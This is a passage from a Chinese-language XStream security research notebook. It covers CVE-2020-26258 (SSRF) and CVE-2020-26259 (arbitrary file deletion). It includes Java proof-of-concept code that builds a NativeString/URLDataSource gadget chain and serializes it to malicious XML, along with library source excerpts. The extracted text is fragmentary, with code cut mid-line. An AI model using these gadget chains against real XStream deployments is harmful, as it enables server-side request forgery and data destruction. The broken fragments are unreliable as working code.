private String getStringValue() { 
        return this.value instanceof String ? (String)this.value : this.value.toString();  sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(nativeString_Class1, objCons); 
sc.setAccessible(true); 
Object nativeString_Object = sc.newInstance(new Object[0]); 
Field nativeStringValueField = nativeString_Object.getClass().getDeclaredField("value"); 
nativeStringValueField.setAccessible(true); 
nativeStringValueField.set(nativeString_Object, base64Data);
最后把NativeString对象放到Map中
Map map = new HashMap(); 
map.put(nativeString_Object, nativeString_Object); 
map.put(nativeString_Object, nativeString_Object); 
所以完整的代码如下：
Base64Data base64Data = new Base64Data(); 
javax.activation.URLDataSource urlDataSource = new javax.activation.URLDataSource(new URL("http://127.0.0.1:1337/internal")); 
DataSourceStreamingDataHandler handler = new DataSourceStreamingDataHandler(urlDataSource); 
base64Data.set(handler); 
Class nativeString_Class1 = Class.forName("jdk.nashorn.internal.objects.NativeString"); 
Constructor objCons = Object.class.getDeclaredConstructor(new Class[0]); 
objCons.setAccessible(true); 
Constructor sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(nativeString_Class1, objCons); 
sc.setAccessible(true); 
Object nativeString_Object = sc.newInstance(new Object[0]); 
Field nativeStringValueField = nativeString_Object.getClass().getDeclaredField("value"); 
nativeStringValueField.setAccessible(true); 
nativeStringValueField.set(nativeString_Object, base64Data); 
Map map = new HashMap(); 
map.put(nativeString_Object, nativeString_Object); 
map.put(nativeString_Object, nativeString_Object); 
XStream xStream = new XStream(); 
String test = xStream.toXML(map); 
System.out.println( 
        test 
); 
值得注意的是通过使⽤newConstructorForSerialization⽅法可以实现反射实例化⼀个没有构造⽅法或者构造⽅法为private修饰的类。
三、任意⽂件删除漏洞 CVE-2020-26259
这个漏洞也是通过NativeString触发的，通过XML污染InputStream的类型，导致后续XStream代码流程执⾏到is.close()的时候，实现
触发。
public byte[] get() { 
    if (this.data == null) { 
        try { 
            ByteArrayOutputStreamEx baos = new ByteArrayOutputStreamEx(1024); 
XStream 安全研究笔记
11
            InputStream is = this.dataHandler.getDataSource().getInputStream(); 
            baos.readFrom(is); 
            is.close();  b.length - off) { 
        throw new IndexOutOfBoundsException(); 
    } else if (len == 0) { 
        return 0; 
    } 
    int n = in.read(b, off, len); 
    if (n  len + 1 && serialized.charAt(len) == '-') { 
                idx = Integer.valueOf(serialized.substring(len + 1)).intValue(); 
            } 
            if (idx >= 0) { 
                final String[] innerFieldNames = getInnerFieldNames(type); 
                if (idx < innerFieldNames.length) { 
                    return innerFieldNames[idx]; 
                } 
            } 
        } 
        return super.realMember(type, serialized); 
    } 
    private String[] getInnerFieldNames(final Class type) { 
        String[] innerFieldNames = (String[])innerFields.get(type.getName()); 
        if (innerFieldNames == null) { 
            innerFieldNames = getInnerFieldNames(type.getSuperclass()); 
            Field[] declaredFields = type.getDeclaredFields(); 
            for (int i = 0; i < declaredFields.length; i++) { 
                final Field field = declaredFields[i]; 
                if (field.getName().startsWith("this$")) { 
                    String[] temp = new String[innerFieldNames.length+1]; 
                    System.arraycopy(innerFieldNames, 0, temp, 0, innerFieldNames.length); 
                    innerFieldNames = temp; 
                    innerFieldNames[innerFieldNames.length - 1] = field.getName(); 
                } 
            } 
            innerFields.put(type.getName(), innerFieldNames); 
        } 
        return innerFieldNames; 
    } 
XStream 安全研究笔记
16
    public void flushCache() { 
        innerFields.keySet().retainAll(Collections.singletonList(Object.class.getName())); 
    } 
}
这就解释了outer-class标签是如何出现的
总结：
寻找这类漏洞需要⼤量的时间，此类组件出现的安全问题均可以通过传递数据实现代码执⾏。
Reference：
http://xstream.10960.n7.nabble.com/How-to-remove-the-quot-outer-class-quot-tags-td5105.html
https://x-stream.github.io/javadoc/com/thoughtworks/xstream/mapper/OuterClassMapper.html
http://x-stream.github.io/CVE-2020-26258.html
http://x-stream.github.io/converters.html
https://x-stream.github.io/CVE-2020-26259.html
https://x-stream.github.io/CVE-2020-26217.html
https://x-stream.github.io/security.html